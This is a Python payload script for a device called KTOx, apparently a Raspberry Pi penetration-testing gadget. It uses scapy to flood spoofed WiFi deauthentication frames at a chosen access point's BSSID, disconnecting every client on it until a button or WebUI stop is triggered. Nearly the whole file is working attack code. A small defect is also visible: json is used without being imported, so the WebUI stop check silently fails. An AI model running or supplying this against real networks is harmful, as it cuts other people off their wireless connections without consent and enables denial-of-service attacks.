#!/usr/bin/env python3
# NAME: Deauth Spoof – WiFi kicker for KTOx
"""
Drop into /root/KTOx/payloads/wifi/deauth_spoof.py
Requires a monitor-mode interface (use Enable Monitor from KTOx menu first).
"""

import sys, os, time, signal
from scapy.all import (
    RadioTap,
    Dot11,
    Dot11Deauth,
    sendp,
    conf,
    get_if_hwaddr,
)

# KTOx supplied environment
LOOT_DIR    = os.environ.get("PAYLOAD_LOOT_DIR", "/root/KTOx/loot")
KTOX_DIR    = os.environ.get("KTOX_DIR", "/root/KTOx")

# ── Button stop detection – reads KTOx’s KEY3 via GPIO or shared file ────────
def is_key3_pressed():
    """Return True if KEY3 is held (physical button or WebUI toggle)."""
    # Physical GPIO (only works if GPIO is still initialised)
    try:
        import RPi.GPIO as GPIO
        # KTOx pin map: KEY3 = 16
        if GPIO.input(16) == 0:
            return True
    except Exception:
        pass
    # WebUI stop command
    try:
        with open("/dev/shm/ktox_payload_request.json") as f:
            data = json.loads(f.read())
        if data.get("action") == "stop":
            return True
    except Exception:
        pass
    return False

# ── Main deauth loop ──────────────────────────────────────────────────────────
def deauth_loop(bssid, iface, reason=7, burst=10):
    print(f"[*] Starting deauth against {bssid} on {iface} (CTRL+C to stop)")
    pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF",
                             addr2=bssid,
                             addr3=bssid) / Dot11Deauth(reason=reason)
    count = 0
    try:
        while True:
            sendp(pkt, iface=iface, count=burst, inter=0.1, verbose=False)
            count += burst
            # Print every 10 bursts to LCD log (if payload log is open)
            if count % 50 == 0:
                print(f"[+] Sent {count} deauth packets")
            # Check for stop button every burst
            if is_key3_pressed():
                print("[!] KEY3 pressed – stopping")
                break
            time.sleep(0.3)
    except KeyboardInterrupt:
        pass
    print(f"[✓] Done. Total packets: {count}")

# ── Entry point – passed from KTOx as: python3 deauth_spoof.py <bssid> <iface> ─
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: deauth_spoof.py <target_bssid> <monitor_iface>")
        sys.exit(1)

    bssid = sys.argv[1].upper()
    iface = sys.argv[2]
    deauth_loop(bssid, iface)
